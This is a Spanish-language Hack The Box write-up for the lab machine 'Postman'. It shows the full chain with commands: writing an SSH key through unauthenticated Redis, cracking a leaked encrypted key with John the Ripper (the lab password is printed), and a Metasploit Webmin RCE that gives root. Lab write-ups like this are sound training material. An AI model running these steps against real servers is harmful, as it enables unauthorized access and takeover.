___
Tags: #Facil #postman #webmin #rce
___
# Postman
## Información General

**- Dificultad:** Fácil <br>
**- Sistema operativo:** Linux <br>
**- Fecha de resolución:** 22/08/2026 <br>
**- Enlace:** [Postman](https://app.hackthebox.com/machines/Postman)

## Correos/Usuarios identificados

A continuación, te presento en formato de tabla el desglose de los usuarios identificados en la máquina _Postman_ y la importancia que cada uno tiene dentro de la cadena de escalada de privilegios hasta alcanzar el nivel de **root**:

| **Usuario**                 | **Rol / Acceso Inicial**                                                                                                                      | **Importancia hacia la Escalada a Root**                                                                                                                                                                             |
| --------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **redis**<br><br>  <br><br> | Servicio de base de datos Redis expuesto (Puerto 6379 sin autenticación)                                                                      | Sirve como el **vector de acceso inicial** al sistema. Al no requerir autenticación, permite aprovechar las opciones de configuración para inyectar una llave SSH maliciosa y obtener una shell interactiva inicial. |
| **Matt**<br><br>  <br><br>  | Usuario del sistema Linux cuya clave privada cifrada (`id_rsa.bak`) fue encontrada dentro de las carpetas accesibles desde la shell anterior. | Es el **trampolín crítico** hacia root. Al descifrar su contraseña (`computer2008`), se obtienen credenciales válidas que permiten autenticarse en el panel administrativo de **Webmin**.                            |
| **root**<br><br>            | Administrador supremo del sistema.                                                                                                            | Es la **meta final** de la intrusión. Se alcanza utilizando las credenciales de Matt dentro de Webmin para ejecutar un exploit (RCE) a través de Metasploit, logrando el control total del servidor y la lectura de  |
## Listado de Vulnerabilidades Identificadas

- **Redis sin autenticación (RCE)**
    
    - **Explicación:** El servicio de base de datos Redis estaba expuesto en el puerto TCP 6379 sin requerir ningún tipo de credencial o contraseña para conectarse.
        
    - **Impacto:** Su impacto es crítico porque permitió interactuar directamente con la base de datos. Al no haber restricciones, se pudo cambiar la configuración del directorio de trabajo de Redis para escribir una clave pública SSH autorizada en el sistema operativo, logrando así la ejecución remota de comandos y el acceso inicial al servidor.
        
- **Exposición de clave privada de respaldo (`id_rsa.bak`)**
    
    - **Explicación:** Dentro de la carpeta `/opt` del sistema se encontró un archivo de respaldo que contenía una clave privada RSA cifrada perteneciente al usuario Matt.
        
    - **Impacto:** Su impacto facilitó enormemente el movimiento lateral o avance en la intrusión. Aunque la clave estaba encriptada, permitió utilizar herramientas de fuerza bruta offline como _John the Ripper_ junto con diccionarios de contraseñas para descifrarla y obtener la contraseña en texto plano de Matt (`computer2008`).
        
- **Vulnerabilidad de Ejecución Remota de Comandos (RCE) en Webmin**
    
    - **Explicación:** El panel administrativo de **Webmin** (versión 1.910) que corría en el puerto TCP 10000 presentaba una vulnerabilidad en su módulo de actualizaciones de paquetes.
        
    - **Impacto:** Esta falla fue la clave absoluta para la escalada de privilegios final. Al combinar un usuario legítimo pero sin privilegios de administrador (Matt) con un exploit de Metasploit diseñado para este fallo, se pudieron ejecutar órdenes arbitrarias que elevaron automáticamente los permisos hasta convertirse en el superusuario del sistema (_root_).

## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.53.172**

### Ping

```
ping -c 1 10.129.53.172
```

<p align="center">
<img src="images/Postmanping.png" width="600" alt="Resultado de Nmap">
</p>

**Su ttl es 63. Por tanto, es Linux**

## Enumeración

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn 10.129.53.172
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Open port/TCP | Service | Version                         |
| ------------- | ------- | ------------------------------- |
| 22            | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80            | http    | Apache httpd 2.4.29             |
| 6379          | redis   | Redis key-value store 4.0.9     |
| 10000         | http    | MiniServ 1.910                  |

### Sitio web - TCP 80

Parece que el sitio está en construcción.

<p align="center">
<img src="images/Postmanweb80.png" width="600" alt="Resultado de Nmap">
</p>

Ningún de los enlaces lleva a ninguna parte, y no encontré nada interesante en la fuente.

#### Gobuster

```
gobuster dir -u http://10.129.53.172 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Estaban activadas, pero no encontré nada interesante en ellas.

<p align="center">
<img src="images/Postmangobuster.png" width="600" alt="Resultado de Nmap">
</p>

### Sitio web - TCP 10000

En TCP 10000, existe una instancia de Webmin. Al acceder a través de HTTP, se devuelve un error:

<p align="center">
<img src="images/Postman1000web.png" width="600" alt="Resultado de Nmap">
</p>

Además, esto proporciona una referencia a HTTPS. Realicé algunas pruebas básicas con el sitio en el puerto 80 utilizando este nombre de host, pero no encontré ninguna diferencia.

### HTTPS

Con HTTPS, obtengo un formulario de inicio de sesión para Webmin.

<p align="center">
<img src="images/Postmanweb.png" width="600" alt="Resultado de Nmap">
</p>

Webmin suele ejecutarse con privilegios de administrador para poder realizar todas las tareas administrativas, así que estaré vigilando las credenciales.

### Redis - TCP 6379

Se está interactuando con un servidor Redis remoto, creaste una variable numérica llamada `dani`, la inicializaste/incrementaste a `1`, verificaste que era la única clave guardada en el sistema y consultaste su valor con éxito.

```
redis-cli -h 10.129.53.172

incr dani

keys *

get dani
```

<p align="center">
<img src="images/Postmanredis.png" width="600" alt="Resultado de Nmap">
</p>

## Explotación

### Shell as redis

El impacto principal de este escenario es la **vulnerabilidad crítica de seguridad y toma de control del servidor**. Al no requerir autenticación, cualquier atacante puede conectarse directamente a la base de datos para **borrar o corromper todos los datos** de la empresa, o bien aprovechar las opciones de configuración de Redis para **escribir una llave SSH maliciosa** en el sistema operativo, logrando así la **ejecución remota de comandos (RCE)** y el acceso total (como root) a toda la máquina.

#### Generar clave SSH

Puedo verificar el directorio actual para Redis.

```
config get dir
```

<p align="center">
<img src="images/Postmangetdir.png" width="600" alt="Resultado de Nmap">
</p>

Puedo suponer que esta es la cuenta que administra el directorio de inicio del servidor Redis. Puedo confirmar esto cambiando el directorio actual a `./.ssh`

Le indica a Redis que cambie su **directorio de trabajo actual** a una subcarpeta llamada `.ssh`

```
config set dir ./.ssh
```

<p align="center">
<img src="images/Postmancambiadoassssh.png" width="600" alt="Resultado de Nmap">
</p>

El hecho de que ese comando funcione indica que el directorio existe, y sugiere que este es el directorio personal de este usuario.

Generaré una clave con `ssh-keygen` , y luego la añadiré a un archivo, incluyendo algunas líneas nuevas adicionales antes y después de la clave.

```
(echo -e "\n\n"; cat /home/dani/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
```

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClSiW+/A4QTERGPOWkdAChuzTPDm6643d/uqkliL/hBAe7AhtOCqmbhAJhGU/e/pD/zl3psPv5Xn+7S9rueIrzuidFRFBXdBLIAkRFwp8NyTYcaYpErIk+u26deBgjJwRywAtI+/5if5oUHzCqhtZfk4AdlpbjfkZiZYPbXMhIZqNEzC/1VIDflHYuEFlelKvXqbPxqMrlx03hV8th5cY4i3OC3vSoIFyGjazQmfis3XWPI/hTVcun1a18ED04W4NB4OZPTiOppW5znroMgrgFxNopnj37RRYzmLJKHyuw0aQtnOBeVU6yWf1edYUglvdPXyoONn0w7nKr6ssOE73guUs/9FCJqIFjVwQddAxU2y+TA7PB+sX4ERHAwYllxZgi1tXTAJ8bt/dUzbSBSm5e2LDI4b20573XuEh5M2CxBit05B8lLwVH9q6Y6xUg2kKyV7SeipMBhELanE8Y7fioS1AAdLVhTZdRWYR7g58IPzmgaDQ7i/sEM7tQriu3bRepOhATMVnGw5oH8N3O9klnetXDBzlgTke2J6fV+EhYFpUk6Ldy3edD9jVNbmWVmZUFAQzEXQXdH8jp/VU01pKDge/bNYlX0yY/8/C4oaT7PnQCU57U7d6ECPbI/S2UdY5bhNs/3jxOUp5WoRQxrBwmXYL3JB+OyHxC0UIOHSGHPQ== dani@kali
```

Una vez creado el archivo `spaced_key.txt` en tu máquina local, puedes cargarlo en una clave de Redis para luego volcarlo al sistema de archivos del servidor remoto:

```
cat spaced_key.txt | redis-cli -h 10.129.53.172 -x set ssh_key
```

<p align="center">
<img src="images/Postmanokspaceykey.png" width="600" alt="Resultado de Nmap">
</p>

Luego, le diré a Redis que el nombre de la base de datos es " `authorized_keys` ", y luego "`save`".

```
config set dbfilename "authorized_keys"

save
```

<p align="center">
<img src="images/Postmansavepostman.png" width="600" alt="Resultado de Nmap">
</p>

#### Shell

```
ssh -i ~/id_rsa_generated redis@10.129.53.172

id
```

> uid=107(redis) gid=114(redis) groups=114(redis)

### redis --> Matt

#### Enumeración

Investigando encuentro el archivo **user.txt** dentro de la carpeta **Matt** pero no tengo permiso para leerlo.

<p align="center">
<img src="images/Postmanuser.txtdenegado.png" width="600" alt="Resultado de Nmap">
</p>

Continuando con la investigación dentro de la carpeta **opt** me encuentro un archivo **id_rsa.bak**

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Lo guardo como **idrsa_matt**

#### Desecriptando idrsa

Usaré la herramienta **ssh2john.py** para desencriptar el **idrsa**

```
/usr/share/john/ssh2john.py idrsa_matt > idrsa_matt.txt

john --wordlist=/usr/share/wordlists/rockyou.txt idrsa_matt.txt
```

<p align="center">
<img src="images/Postmanidrsajohn1231.png" width="600" alt="Resultado de Nmap">
</p>

Vuelvo a la sesión donde conseguí el idrsa y hago lo siguiente 

```
su Matt
#pass --> computer2008
```

<p align="center">
<img src="images/Postmanuser.txtadasd.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

### Matt --> Root

#### Enumeración

Con el contraseña de Matt, decidí revisar **Webmin**, ya que es muy común que Webmin utilice la autenticación del sistema. Y efectivamente, funcionó:

<p align="center">
<img src="images/Postmanwebmin.png" width="600" alt="Resultado de Nmap">
</p>

Matt no tiene acceso para hacer muchas cosas.

#### Explotación con Metasploit

Decidí investigar a ver si en metasploit encontraba algun rce, y bingo 

```
msfconsole -q 

search webmin rce
```

Resulta que metasploit tiene un rce para webmin

<p align="center">
<img src="images/Postman5meta.png" width="600" alt="Resultado de Nmap">
</p>

```
show options
```

<p align="center">
<img src="images/Postmanoptions.png" width="600" alt="Resultado de Nmap">
</p>

Las opciones que señale son los que tengo rellenar

```
set LHOST 10.10.14.188
set SSL true
set RHOSTS 10.129.53.172
set USERNAME Matt 
set PASSWORD computer2008
run 
```

<p align="center">
<img src="images/Postmanrun.png" width="600" alt="Resultado de Nmap">
</p>

Parece que la sesión quedará congelada pero con el siguiente comando se arreglará todo:

```
python -c 'import pty; pty.spawn("/bin/bash")'
id
```

<p align="center">
<img src="images/Postmanroot.png" width="600" alt="Resultado de Nmap">
</p>

Luego conseguimos root.txt

<p align="center">
<img src="images/Postmanroot.txt.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

**Postman** es una máquina Linux de dificultad fácil que destaca por combinar fallos comunes de configuración y servicios expuestos para ilustrar una cadena de intrusión completa. Su resolución comienza aprovechando un servicio de Redis sin autenticación en el puerto 6379 para lograr el acceso inicial mediante una clave SSH inyectada, continúa con la localización de una clave privada de respaldo (`id_rsa.bak`) en el directorio `/opt` que permite obtener credenciales válidas tras un ataque de fuerza bruta con John the Ripper, y culmina escalando privilegios hasta _root_ mediante un exploit de ejecución remota de comandos (RCE) en el panel administrativo de Webmin utilizando a través de Metasploit las credenciales obtenidas del usuario Matt.
